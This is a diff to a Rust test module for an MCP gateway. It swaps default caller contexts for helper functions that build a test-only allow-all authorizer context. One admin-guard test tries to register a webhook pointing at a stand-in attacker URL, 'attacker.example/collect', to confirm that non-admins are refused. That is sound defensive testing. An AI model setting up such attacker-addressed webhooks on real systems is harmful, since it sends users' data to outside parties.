@@ -13,6 +13,45 @@ use crate::protocol::RequestId;
 use super::*;
 use crate::gateway::trace;
 
+/// The permissive authorizer the helpers below hand out.
+static ALLOW_ALL: crate::gateway::authz::AllowAll = crate::gateway::authz::AllowAll;
+
+/// As [`allow_all_ctx`], but carrying a caller identity.
+///
+/// Kept separate so a test that depends on the identity reaching dispatch says
+/// so, and a test that does not stays on the plain form.
+fn allow_all_ctx_named<'a>(
+    api_key_name: Option<&'a str>,
+    agent_id: Option<&'a str>,
+) -> crate::gateway::meta_mcp::MetaMcpCallerContext<'a> {
+    crate::gateway::meta_mcp::MetaMcpCallerContext {
+        authorizer: &ALLOW_ALL,
+        api_key_name,
+        agent_id,
+        grant_subject: None,
+        verified_identity: None,
+        is_admin: false,
+    }
+}
+
+/// A caller context that permits everything, for tests whose subject is not
+/// authorization.
+///
+/// Named at every call site rather than reached through a `Default`, so a test
+/// that is not exercising the authorizer says so out loud. `AllowAll` is
+/// `#[cfg(test)]`, so no release build can reach this path.
+fn allow_all_ctx() -> crate::gateway::meta_mcp::MetaMcpCallerContext<'static> {
+    crate::gateway::meta_mcp::MetaMcpCallerContext {
+        authorizer: &ALLOW_ALL,
+        api_key_name: None,
+        agent_id: None,
+        grant_subject: None,
+        verified_identity: None,
+        is_admin: false,
+    }
+}
+
+
 // ── augment_with_trace ────────────────────────────────────────────────
 
 #[test]
@@ -319,7 +358,7 @@ async fn code_mode_execute_missing_tool_parameter_returns_error() {
         .code_mode_execute(
             &args,
             None,
-            &crate::gateway::meta_mcp::MetaMcpCallerContext::default(),
+            &allow_all_ctx(),
         )
         .await;
     // THEN: error about missing 'tool'
@@ -341,7 +380,7 @@ async fn code_mode_execute_bare_tool_name_without_server_returns_error() {
         .code_mode_execute(
             &args,
             None,
-            &crate::gateway::meta_mcp::MetaMcpCallerContext::default(),
+            &allow_all_ctx(),
         )
         .await;
     // THEN: error about missing server prefix
@@ -363,7 +402,7 @@ async fn code_mode_execute_chain_empty_array_returns_error() {
         .code_mode_execute(
             &args,
             None,
-            &crate::gateway::meta_mcp::MetaMcpCallerContext::default(),
+            &allow_all_ctx(),
         )
         .await;
     // THEN: error about empty chain
@@ -389,7 +428,7 @@ async fn code_mode_execute_chain_step_missing_tool_field_returns_error() {
         .code_mode_execute(
             &args,
             None,
-            &crate::gateway::meta_mcp::MetaMcpCallerContext::default(),
+            &allow_all_ctx(),
         )
         .await;
     // THEN: error about missing tool field in step 0
@@ -415,7 +454,7 @@ async fn code_mode_execute_chain_step_bare_tool_name_returns_error() {
         .code_mode_execute(
             &args,
             None,
-            &crate::gateway::meta_mcp::MetaMcpCallerContext::default(),
+            &allow_all_ctx(),
         )
         .await;
     // THEN: error about missing server prefix for step 0
@@ -440,7 +479,7 @@ async fn gateway_search_is_callable_regardless_of_code_mode_flag() {
             "gateway_search",
             args,
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
     // THEN: no JSON-RPC error (-32601 unknown tool), just zero results
@@ -571,11 +610,7 @@ providers:
                 "arguments": {}
             }),
             Some("session-1"),
-            Some("alice"),
-            Some("agent-1"),
-            None,
-            None,
-            false,
+            &allow_all_ctx_named(Some("alice"), Some("agent-1")),
         )
         .await
         .unwrap();
@@ -673,11 +708,16 @@ providers:
                 "arguments": {}
             }),
             Some("session-1"),
-            Some("shared-api-key"),
-            Some("agent-1"),
-            Some(subject),
-            None,
-            false,
+            &{
+                crate::gateway::meta_mcp::MetaMcpCallerContext {
+                    authorizer: &ALLOW_ALL,
+                    api_key_name: Some("shared-api-key"),
+                    agent_id: Some("agent-1"),
+                    grant_subject: Some(subject),
+                    verified_identity: None,
+                    is_admin: false,
+                }
+            },
         )
         .await
         .unwrap();
@@ -722,11 +762,7 @@ async fn gateway_invocation_attaches_context_integrity_metadata_to_risky_tool_ou
                 "arguments": {}
             }),
             Some("session-1"),
-            Some("alice"),
-            Some("agent-1"),
-            None,
-            None,
-            false,
+            &allow_all_ctx_named(Some("alice"), Some("agent-1")),
         )
         .await
         .unwrap();
@@ -988,7 +1024,7 @@ async fn gateway_execute_missing_tool_and_chain_returns_tool_call_error() {
             "gateway_execute",
             args,
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
     // THEN: returns an error (not -32601 unknown tool)
@@ -1222,7 +1258,7 @@ async fn gateway_reload_config_surfaces_restart_required_fields() {
             "gateway_reload_config",
             json!({}),
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
 
@@ -1483,7 +1519,7 @@ async fn tools_call_surfaced_tool_on_missing_backend_returns_error() {
             "pinned_tool",
             json!({"arg": "val"}),
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
 
@@ -1516,7 +1552,7 @@ async fn tools_call_unknown_non_surfaced_tool_returns_32601() {
             "totally_unknown_xyz",
             json!({}),
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
 
@@ -1542,7 +1578,7 @@ async fn tools_call_surfaced_tool_name_bypasses_meta_tool_dispatch() {
             "my_surfaced_tool",
             json!({}),
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
 
@@ -1575,7 +1611,7 @@ async fn colliding_name_is_dispatched_as_meta_tool_not_proxy() {
             "gateway_list_servers",
             json!({}),
             None,
-            MetaMcpCallerContext::default(),
+            allow_all_ctx(),
         )
         .await;
 
@@ -2001,11 +2037,7 @@ mod attestation_wiring {
         meta.invoke_tool(
             &json!({"server": "remote_docs", "tool": "search", "arguments": {}}),
             Some("session-1"),
-            Some("alice"),
-            Some("agent-1"),
-            None,
-            None,
-            false,
+            &allow_all_ctx_named(Some("alice"), Some("agent-1")),
         )
         .await
         .unwrap()
@@ -2205,7 +2237,7 @@ mod attestation_wiring {
 #[tokio::test]
 async fn cost_report_refuses_the_admin_view_for_a_non_admin() {
     let meta = make_meta_mcp();
-    let caller = crate::gateway::meta_mcp::MetaMcpCallerContext::default();
+    let caller = allow_all_ctx();
     assert!(!caller.is_admin, "the default caller holds no admin");
 
     for flag in ["include_all_sessions", "include_all_keys"] {
@@ -2235,7 +2267,7 @@ async fn cost_report_refuses_the_admin_view_for_a_non_admin() {
 #[tokio::test]
 async fn cost_report_refuses_another_callers_session_for_a_non_admin() {
     let meta = make_meta_mcp();
-    let caller = crate::gateway::meta_mcp::MetaMcpCallerContext::default();
+    let caller = allow_all_ctx();
     let args = json!({ "session_id": "someone-elses-session" });
 
     let result = meta
@@ -2310,7 +2342,7 @@ auth:
     let meta = MetaMcp::new(Arc::new(BackendRegistry::new()));
     meta.set_capabilities(cap_backend);
 
-    let caller = crate::gateway::meta_mcp::MetaMcpCallerContext::default();
+    let caller = allow_all_ctx();
     assert!(!caller.is_admin);
 
     let args = json!({
@@ -2318,9 +2350,7 @@ auth:
         "tool": "register_webhook",
         "arguments": { "url": "https://attacker.example/collect" }
     });
-    let result = meta
-        .invoke_tool(&args, None, None, None, None, None, caller.is_admin)
-        .await;
+    let result = meta.invoke_tool(&args, None, &caller).await;
     assert!(
         result.is_err(),
         "a non-admin caller must not create an attacker-addressed webhook"
@@ -2333,9 +2363,11 @@ auth:
 
     // An admin caller reaches the capability. It fails at the network, which is
     // the point: the guard is what differs, not the outcome.
-    let admin = meta
-        .invoke_tool(&args, None, None, None, None, None, true)
-        .await;
+    let admin_caller = MetaMcpCallerContext {
+        is_admin: true,
+        ..allow_all_ctx()
+    };
+    let admin = meta.invoke_tool(&args, None, &admin_caller).await;
     let admin_msg = admin.map_or_else(|e| e.to_string(), |_| String::new());
     assert!(
         !admin_msg.to_lowercase().contains("admin credential"),
@@ -2350,7 +2382,7 @@ auth:
 fn the_stdio_caller_is_the_operator() {
     // Guarding the constant the stdio dispatcher builds, so a later refactor
     // that drops it fails here rather than silently removing the tools.
-    let default_caller = crate::gateway::meta_mcp::MetaMcpCallerContext::default();
+    let default_caller = allow_all_ctx();
     assert!(
         !default_caller.is_admin,
         "the DEFAULT must stay non-admin: every network path uses it"
@@ -2366,7 +2398,7 @@ fn the_stdio_caller_is_the_operator() {
 fn a_playbook_carries_the_caller_identity() {
     let caller = crate::gateway::meta_mcp::MetaMcpCallerContext {
         api_key_name: Some("scoped-client"),
-        ..crate::gateway::meta_mcp::MetaMcpCallerContext::default()
+        ..allow_all_ctx()
     };
     // The invoker is built from the caller, so the fields a scoping check reads
     // are present rather than None.
